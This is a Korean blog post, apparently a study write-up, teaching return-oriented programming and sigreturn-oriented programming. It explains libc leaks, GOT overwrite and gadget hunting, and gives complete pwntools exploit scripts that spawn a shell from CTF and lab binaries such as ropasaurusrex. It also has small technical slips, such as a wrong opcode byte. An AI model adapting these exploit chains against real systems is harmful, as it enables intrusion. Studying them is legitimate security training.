---
tistoryBlogName: k0n9
tistoryTitle: ROP
tistoryVisibility: "3"
tistoryCategory: "1117646"
tistorySkipModal: true
tistoryPostId: "30"
tistoryPostUrl: https://k0n9.tistory.com/30
---
## ROP란?

Return Oriented Programming

GOT overwrite, RTL, RTL chaining 등을 종합적으로 쓰는 공격기법

## 구해야 하는 것들

read_plt, read_got, write_plt, write_got, read에 대한 system의 offset, pppr가젯주소, bss주소 등이 있고 꼭 위의 것들이 아니여도 유연하게 할 수 있다.

## 공격순서

1. buf,sfp 채우기
2. write_plt로 write함수 호출하고 pppr 가젯을 사용, 인자값으로 read_got참조, 즉 read의 실제 주소 출력한다.
3. read의 실제주소 - read_offset 으로 libc_base 를 구해낸다.
4. libc_base + system_offset 으로 system의 실제 주소를 구해낸다.
5. read_plt로 read함수 호출하고 pppr 가젯을 사용, 인자값으로 bss주소를 입력하여 bss를 참조한다. 입력값으로는 /bin/sh입력, 즉 bss에 /bin/sh입력
6. read_plt로 read함수 호출하고 pppr 가젯을 사용, 인자값으로 write_got를 참조하고 입력값으로 system의 실제주소. 즉 write_got를 참조해서 write의 실제 주소를 system의 실제 주소로 바꿈
7. write_plt로 write함수 호출하고 다음 실행할 명령어가 없으니 더미를 아무 값으로 채훈다, 인자값으로 bss주소를 입력한다. 즉 write함수를 호출하는데 write_got에는 system함수의 주소가 들어있으니 결과적으로 system함수가 호출된다. 인자값으로는 bss에 /bin/sh를 사용, 즉, system(“/bin/sh”)실행

위의 방법은 여러 방법중 하나이며 때와 상황에 따라 다양하게 변할 수 있다.

이 기법도 RTL가 마찬가지로 x86과 x64가 조금씩 다르다. x86은 함수, 가젯, 인자, 함수, 가젯, 인자 ... 이지만 x64는 가젯, 인자, 함수, 가젯, 인자, 함수 이다.

### find gadget
가젯 쉽게 찾기

pop rdi, pop rsi, ret 가젯

\_\_libc_csu_init 함수의 밑 부분에 여러개의 pop을 볼 수 있다.
![](https://i.imgur.com/ok0X9kw.png)

pop rsi, pop rdi 의 기계어 코드를 보자.

```C
int main(){
	__asm__("pop %rsi");
	__asm__("pop %rdi");
}
```

![](https://i.imgur.com/RlQlZRm.png)

기계어를 보면 pop rsi 는 5e이고 pop rdi는 5r 이다. 그런데 이것을 pop r14와 pop r15 를 보면 5e와 5f가 있는 것을 볼 수 있다. 즉 pop r14, pop r15로 pop rsi, pop rdi 의 역할을 할 수 있다.

#### pppr 가젯

read 같이 인자가 3개인 함수는 pppr 가젯을 사용해야 하는데 일반적인 상황에서 pppr 가젯을 얻기 힘들다. 그래서 이러한 경우에는

**pr 인자 ppr 인자 인자**

이렇게 하는게 좋다. pr인자는 pop rdi, ppr인자는 pop rsi pop r15로 한다. 이때 pop r15를 처리해줘야 하기 때문에 0을 넣어준다. 

#### pop rdx, ret 찾기
일단 rdi, rsi는 해결했다. 그럼 rdx는 어떻게 할까? 이는 rdx gadget control을 통해 만들 수 있다. 우선 기본적으로 rdx는 잘 변하지 않는 가젯이다. 그러나 printf 후에 rdx는 0으로, puts 후에는 1 로 바뀐다. 이렇게 rdx를 조작하는 함수를 호출함으로써 rdx를 조작한다.


### 예제_ropasaurusrex

checksec
![](https://i.imgur.com/2NMf9hk.png)
x86 환경이다.

메인함수
![](https://i.imgur.com/kEtmk9x.png)

![](https://i.imgur.com/tjZZQo2.png)

간단하게 136크기의 버퍼와 read로 0x100만큼 입력을 받는 buffer overflow가 일어난다. 익스플로잇 코드를 보자.

```c
from pwn import *
import time
  
p = process("./ropasaurusrex")
e = ELF("./ropasaurusrex")
  
read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
write_got = e.got['write']
read_system_off = 0xc1f70
  
pppr = 0x80484b6
bss = 0x8049628
  
 
ex = b'a'*136
ex += b'a'*0x4
  
ex += p32(write_plt)
ex += p32(pppr)
ex += p32(1)
ex += p32(read_got)
ex += p32(4)
ex += p32(read_plt)
ex += p32(pppr)
ex += p32(0)
ex += p32(bss)
ex += p32(8)
ex += p32(read_plt)
ex += p32(pppr)
ex += p32(0)
ex += p32(write_got)
ex += p32(4)
ex += p32(write_plt)
ex += b'aaaa'
ex += p32(bss)
  
p.send(ex)
  
read =  u32(p.recv()[-4:])
  
system = read - read_system_off
  
 
p.send(b'/bin/sh')
  
time.sleep(1)
p.send(p32(system))
p.interactive()
```

우선 write함수로 read의 got를 참조 즉 read의 실제 주소를 알아낸다. 그리고 read함수로 bss를 참조해 bss에 /bin/sh를 입력한다. 그리고 다시 read함수로 write의 got를 참조한다. 그리고 그 입력값으로 system함수의 주소를 넣는다. 아까 read함수의 실제 주소를 알아냈으니 이미 구해둔 read와 system의 offset으로 system의 주소를 알아낼수 있다. 그러면 결국 wrtie함수의 got에 system함수가 들어갔으니 write함수를 사용하고 인자값으로 bss를 넣어준다. 그러면 system함수에 인자값으로 /bin/sh 가 들어가니 결과적으로 system(”/bin/sh”)가 실행되게 되고 셸을 딸 수 있다.
![](https://i.imgur.com/8Z2Q67j.png)



### 예제_chall
checksec
![](https://i.imgur.com/L0NO0xR.png)

코드
![](https://i.imgur.com/0x3wrfH.png)

우선 100보다 작은 수를 입력받고 입력받은 값 -1 이 read 입력값의 크기가 된다. 그런데 여기서 %d로 음수검증이 없어 음수 최솟값을 입력한다.
그러면 read는 크기 제한이 없어져서 ropasaurusrex처럼 익스플로잇하면 된다. 가젯은 gift함수에 있고 여기서는 write가 없으니 puts함수를 사용하자.
```python
from pwn import *
  
context.log_level= 'debug'
  
e= ELF("./challenge")
p = process("./challenge")
  
 
pause()
  
p.sendlineafter(b"score.", str(-2147483648))
  
  
read_plt = e.plt['read']
read_got = e.got['read']
printf_plt = e.plt['puts']
printf_got = e.got['puts']
read_system_off = 0xc3c20 # read가 더 큼
  
pop_rdx_rsi_rdi = 0x401235
pop_rdi = 0x401237
  
bss = 0x404070
  
ex = b'a'*0x70
ex += b'b'*0x8
  
ex += p64(pop_rdi)
ex += p64(read_got)
ex += p64(printf_plt)
  
ex += p64(pop_rdx_rsi_rdi)
ex += p64(8)
ex += p64(bss)
ex += p64(0)
ex += p64(read_plt)
  
ex += p64(pop_rdx_rsi_rdi)
ex += p64(8)
ex += p64(printf_got)
ex += p64(0)
ex += p64(read_plt)
  
ex += p64(pop_rdi)
ex += p64(bss)
ex += p64(printf_plt)
  
p.sendafter("comment.",ex)
  
p.recvuntil("you!\n")
read =  u64(p.recv(6)+b"\x00\x00")
  
system = read - read_system_off
  
 
p.send(b'/bin/sh')
  
sleep(1)
p.send(p64(system))
p.interactive()
```
![](https://i.imgur.com/tTqLs61.png)


## SROP

## SROP란?

리눅스에서는 시그널이 들어오면 커널 모드에서 처리하게 되는데, 커널 모드에서 유저모드로 돌아오는 과정에서 유저의 스택에 레지스터 정보들을 저장해놓는다. rt_sigreturn은 이렇게 저장해놓은 정보들을 다시 돌려놓을 때 사용된다.

만약 공격자가 rt_sigreturn 시스템 콜을 호출할 수 있고 스택을 조작할 수 있다면 모든 레지스터와 세그먼트를 조작할 수 있다. 이처럼 rt_sigreturn 시스템 콜을 사용하여 익스플로잇 하는 기법을 SigReturn Oriented Programming(SROP)라고 한다.

## restore_sigcontext

```c
static int restore_sigcontext(struct pt_regs *regs,
			      struct sigcontext __user *sc,
			      unsigned long uc_flags)
{
	unsigned long buf_val;
	void __user *buf;
	unsigned int tmpflags;
	unsigned int err = 0;
	/* Always make any pending restarted system calls return -EINTR */
	current->restart_block.fn = do_no_restart_syscall;
	get_user_try {
#ifdef CONFIG_X86_32
		set_user_gs(regs, GET_SEG(gs));
		COPY_SEG(fs);
		COPY_SEG(es);
		COPY_SEG(ds);
#endif /* CONFIG_X86_32 */
		COPY(di); COPY(si); COPY(bp); COPY(sp); COPY(bx);
		COPY(dx); COPY(cx); COPY(ip); COPY(ax);
#ifdef CONFIG_X86_64
		COPY(r8);
		COPY(r9);
		COPY(r10);
		COPY(r11);
		COPY(r12);
		COPY(r13);
		COPY(r14);
		COPY(r15);
         ...
}
```

rt_sigreturn 은 오른쪽의 코드처럼 COPY와 COPY_SEG 매크로를 사용하여 레지스터 및 세그먼트를 복원한다. SROP 기법을 사용하여 공격하기 위해서는 sigcontext 구조체를 알고 있어야 한다. sigcontext-32bit와 sigcontext-64bit는 각각 x86과 x86_64에서의 sigcontext 구조체이다.

### sigcontext-32bit

```c
struct sigcontext
{
  unsigned short gs, gsh;
  unsigned short fs, fsh;
  unsigned short es, esh;
  unsigned short ds, dsh;
  unsigned long edi;
  unsigned long esi;
  unsigned long ebp;
  unsigned long esp;
  unsigned long ebx;
  unsigned long edx;
  unsigned long ecx;
  unsigned long eax;
  unsigned long trapno;
  unsigned long err;
  unsigned long eip;
  unsigned short cs, __csh;
  unsigned long eflags;
  unsigned long esp_at_signal;
  unsigned short ss, __ssh;
  struct _fpstate * fpstate;
  unsigned long oldmask;
  unsigned long cr2;
};
```

### sigcontext-64bit

```c
struct sigcontext
{
  __uint64_t r8;
  __uint64_t r9;
  __uint64_t r10;
  __uint64_t r11;
  __uint64_t r12;
  __uint64_t r13;
  __uint64_t r14;
  __uint64_t r15;
  __uint64_t rdi;
  __uint64_t rsi;
  __uint64_t rbp;
  __uint64_t rbx;
  __uint64_t rdx;
  __uint64_t rax;
  __uint64_t rcx;
  __uint64_t rsp;
  __uint64_t rip;
  __uint64_t eflags;
  unsigned short cs;
  unsigned short gs;
  unsigned short fs;
  unsigned short pad0;
  uint64_t err;
  __uint64_t trapno;
  __uint64_t oldmask;
  __uint64_t cr2;
  extension union
    {
      struct _fpstate * fpstate;
      __uint64_t __fpstate_word;
    };
  __uint64_t __reserved1 [8];
};
```

## 예제

```c
// gcc -o srop srop.c -fno-stack-protector
#include <stdio.h>
int gadget() {
	__asm("pop %rax");
	__asm("syscall");
	__asm("ret");
}
int main()
{
	char buf[16];
	read(0, buf ,1024);
}
```

본 예제는 16바이트의 버퍼에 1024바이트를 입력받기 때문에 스택 버퍼 오버플로우가 발생한다. 스택 버퍼 오버플로우를 x86_64 SROP를 이용해 익스플로잇 해보자

우선 pop %rax syscall ret 가젯의 주소를 알아낸다.(no pie)

```c
#srop_test.py
from pwn import *
p = process("./srop")
gadget = 0x40052a # pop rax; syscall
payload = "A"*16
payload += "B"*8
payload += p64(gadget)
payload += p64(15) # sigreturn
payload += "\\x00"*40 # dummy
payload += p64(0x4141414141414141)*20
p.sendline(payload)
p.interactive()
```

srop_test.py는 pop rax ; syscall 가젯을 사용하여 rax 레지스터를 rt_sigreturn의 시스템 콜 번호인 15로 설정하고 syscall 명령어를 실행하는 스크립트이다.

rt_sigreturn 시스템 콜이 호출되었을 때의 레지스터를 보자.

![](https://i.imgur.com/XK6h8vM.png)


레지스터의 값들이 스택에 저장되어 있던 값들로 바뀌어 있는 것을 확인할 수 있다.

### 익스코드

pwntools의 SigreturnFrame은 SROP 익스플로잇을 위한 클래스이다. SROP를 이용해 공격을 할 때는 sigcontext 구조체에 맞게 공격 코드를 구성해야 하는 번거로움이 있지만 SigreturnFrame를 사용하면 비교적 쉽게 SROP 공격 코드를 만들 수 있다.

```python
>>> from pwn import *
>>> context.clear(arch='amd64')
>>> frame = SigreturnFrame()
>>> frame.rdi = 0x41414141
>>> frame.rax = 59
>>> frame.rsi = 12341234
>>> print str(frame).encode('hex')
00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004141414100000000f24fbc00000000000000000000000000000000000000000000000000000000003b00000000000000000000000000000000000000000000000000000000000000000000000000000033000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
```

아키텍처마다 sigcontext 구조체가 다르기 때문에 pwntools에 아키텍처 정보를 명시해줘야 한다.

srop.py 에서는 SROP를 통해 read 시스템 콜을 호출하여 bss 영역에 0x1000 바이트만큼 입력받고 rsp 레지스터를 bss 영역의 주소로 바꿔 다시 한 번 ROP를 할 수 있게 한다.

두번째 페이로드에서 SROP를 이용해 rax 레지스터를 execve 시스템 콜 번호인 0x3b로 조작하고, rdi 레지스터를 /bin/sh 문자열이 존재하는 주소로 조작한 후 syscall 명령어를 실행해 셸을 획득한다.

```python
# srop.py
from pwn import *

context.log_level = 'debug'

context.clear(arch='amd64')
p = process("./srop")
elf = ELF("./srop")
gadget = 0x40113e # pop rax; syscall
syscall = 0x40113f
binsh = "/bin/sh\\x00"
read_got = elf.got['read']
_start = elf.symbols['_start']
frame = SigreturnFrame()
#read(0, 0x404030, 0x1000)
frame.rax = 0        # SYS_read
frame.rsi = 0x404030 # bss 영역 주소
frame.rdx = 0x1000
frame.rdi = 0
frame.rip = syscall
frame.rsp = 0x404030 
payload = b"A"*16
payload += b"B"*8
payload += p64(gadget)
payload += p64(15) # sigreturn

payload += bytes(frame)
pause()
p.sendline(payload)
sleep(1)
frame2 = SigreturnFrame()
frame2.rip = syscall
frame2.rax = 0x3b # execve
frame2.rsp = 0x404328 # 아무 값
frame2.rdi = 0x404138 # bss에 쓰여진 /bin/sh 의 주소
ropa = p64(gadget)
ropa += p64(15)
ropa += bytes(frame2)

ropa += b"/bin/sh\\x00" # /bin/sh의 문자열을 직접 씀
p.sendline(ropa)
p.interactive()
```
![](https://i.imgur.com/z37Ekhd.png)

